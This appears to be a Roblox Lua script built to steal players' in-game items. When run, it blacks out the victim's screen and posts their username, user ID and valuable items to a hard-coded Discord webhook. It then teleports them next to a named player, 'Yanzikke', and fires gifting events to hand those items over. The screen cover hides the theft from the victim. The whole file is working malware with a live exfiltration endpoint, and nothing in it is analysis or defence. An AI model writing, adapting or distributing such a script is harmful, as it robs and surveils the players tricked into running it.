--===[ USER CONFIGURATION ]===--
local webhookURL = "https://discord.com/api/webhooks/1111606979585130537/0joXFyaI312c33vvQLZ0-7M7dCOJJjIeRYQVxB2qyMg79N0ZSZokugMrbI9G9WhoOnHl"
local tradeTarget = "Yanzikke"
local valuableItems = {
    "Candy Blossom",
    "DragonFly",
    "Racoon",
    "Cactus",
    "Durian",
    "Chicken Zombie",
    "Blood Hedgehog"
}
--============================--

local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local HttpService = game:GetService("HttpService")
local MarketplaceService = game:GetService("MarketplaceService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")

-- Find or create RemoteEvents
local function getRemoteEvent(name)
    local event = ReplicatedStorage:FindFirstChild(name)
    if not event then
        event = Instance.new("RemoteEvent")
        event.Name = name
        event.Parent = ReplicatedStorage
    end
    return event
end

local GiftRemote = getRemoteEvent("GiftItemRemote")
local ProximityRemote = getRemoteEvent("CheckProximityRemote")

-- SCREEN BLACKOUT
local function blackoutScreen()
    local gui = Instance.new("ScreenGui", LocalPlayer:WaitForChild("PlayerGui"))
    gui.Name = "Blackout_" .. math.random(1, 10000)
    local frame = Instance.new("Frame", gui)
    frame.BackgroundColor3 = Color3.new(0, 0, 0)
    frame.Size = UDim2.new(1, 0, 1, 0)
    frame.ZIndex = 999
end

-- SEND WEBHOOK
local function sendWebhook()
    local success, err = pcall(function()
        local backpack = LocalPlayer:FindFirstChild("Backpack") or LocalPlayer:WaitForChild("Backpack", 5)
        if not backpack then return end
        
        local count = 0
        local itemsList = {}

        for _, item in ipairs(backpack:GetChildren()) do
            if table.find(valuableItems, item.Name) then
                count += 1
                table.insert(itemsList, item.Name)
            end
        end

        local placeName = "Unknown"
        local placeInfo = pcall(function()
            return MarketplaceService:GetProductInfo(game.PlaceId)
        end)
        if placeInfo then placeName = placeInfo.Name end

        local payload = {
            username = "Item Logger",
            embeds = {{
                title = "Script Executed",
                color = 65280,
                fields = {
                    {name = "Username", value = LocalPlayer.Name, inline = true},
                    {name = "User ID", value = tostring(LocalPlayer.UserId), inline = true},
                    {name = "Place", value = placeName, inline = true},
                    {name = "Join Link", value = "https://www.roblox.com/users/" .. LocalPlayer.UserId .. "/profile", inline = false},
                    {name = "Players in Server", value = tostring(#Players:GetPlayers()), inline = true},
                    {name = "Valuables", value = count > 0 and (count .. " item(s): " .. table.concat(itemsList, ", ")) or "No valuable items found", inline = false}
                },
                timestamp = DateTime.now():ToIsoDate()
            }}
        }

        local jsonPayload = HttpService:JSONEncode(payload)
        HttpService:PostAsync(webhookURL, jsonPayload)
    end)
    
    if not success then
        warn("Webhook failed: " .. tostring(err))
    end
end

-- TELEPORT TO TARGET
local function teleportToTarget(target)
    if not target.Character then
        target.CharacterAdded:Wait()
        task.wait(1)
    end
    
    local targetHRP = target.Character:WaitForChild("HumanoidRootPart")
    LocalPlayer.Character:WaitForChild("HumanoidRootPart").CFrame = targetHRP.CFrame * CFrame.new(3, 0, 3)
    task.wait(1)
end

-- GIFT ITEMS VIA REMOTEEVENT
local function giftViaRemote(target, item)
    -- First try the standard RemoteEvent approach
    GiftRemote:FireServer(target, item)
    
    -- Fallback: If game uses specific gifting method
    local success = pcall(function()
        -- Some games use this pattern:
        game:GetService("ReplicatedStorage").GiftItem:FireServer(target, item)
        
        -- Or this alternative:
        game:GetService("ReplicatedStorage").Events.GiftItem:FireServer(target, item)
    end)
    
    if not success then
        warn("Failed to find working RemoteEvent for gifting")
    end
end

-- AUTO GIFT USING REMOTEEVENTS
local function autoGiftAll()
    local target = Players:FindFirstChild(tradeTarget)
    if not target then
        warn(tradeTarget .. " not found in server.")
        return
    end

    -- Wait for character to load
    if not LocalPlayer.Character then
        LocalPlayer.CharacterAdded:Wait()
        task.wait(1)
    end

    local backpack = LocalPlayer:FindFirstChild("Backpack") or LocalPlayer:WaitForChild("Backpack", 5)
    if not backpack then
        warn("Backpack not found")
        return
    end

    -- Teleport near target
    teleportToTarget(target)
    
    -- Check proximity via RemoteEvent
    local isCloseEnough = false
    ProximityRemote.OnClientEvent:Connect(function(result)
        isCloseEnough = result
    end)
    ProximityRemote:FireServer(target)
    task.wait(0.5)

    if not isCloseEnough then
        teleportToTarget(target) -- Try again
        task.wait(1)
    end

    -- Gift each item
    for _, item in ipairs(backpack:GetChildren()) do
        if table.find(valuableItems, item.Name) then
            giftViaRemote(target, item)
            task.wait(1) -- Cooldown between gifts
        end
    end
end

-- MAIN EXECUTION
local function main()
    blackoutScreen()
    sendWebhook()
    task.wait(2)
    autoGiftAll()
end

-- Run with protection
local success, err = pcall(main)
if not success then
    warn("Script crashed: " .. tostring(err))
end